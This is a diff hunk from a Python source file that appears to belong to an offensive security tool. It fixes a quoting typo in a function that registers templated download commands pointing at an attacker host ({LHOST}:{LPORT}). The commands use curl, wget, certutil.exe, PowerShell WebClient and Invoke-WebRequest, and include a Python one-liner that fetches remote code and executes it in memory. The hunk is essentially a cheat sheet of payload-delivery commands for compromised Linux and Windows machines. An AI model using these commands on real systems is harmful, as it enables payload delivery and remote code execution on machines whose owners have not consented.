@@ -121,7 +121,7 @@ def populate_downloaders():
     ## TODO: populate this
     add_downloader(linux, 'curl', '''curl http://{LHOST}:{LPORT}/{INPUTFILE} -o {OUTPUTFILE}''')
     add_downloader(linux, 'wget', '''wget {LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
-    add_downloader(downloaders_dict=linux, type='python', notes="In memory", downloader=''''python -c "import urllib2; exec urllib2.urlopen('{LHOST}:{LPORT}/{INPUTFILE}').read()"''')
+    add_downloader(downloaders_dict=linux, type='python', notes="In memory", downloader='''python -c "import urllib2; exec urllib2.urlopen('{LHOST}:{LPORT}/{INPUTFILE}').read()"''')
     add_downloader(windows, 'certutil', '''certutil.exe -urlcache -f http://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}''')
     add_downloader(windows, 'powershell', '''powershell.exe -c "(New-Object Net.WebClient).DownloadFile('http://{LHOST}:{LPORT}/{INPUTFILE}','{OUTPUTFILE}')"''')
     add_downloader(windows, 'powershell', '''powershell.exe -c "Invoke-WebRequest 'http://{LHOST}:{LPORT}/{INPUTFILE}' -OutFile '{OUTPUTFILE}' ''')
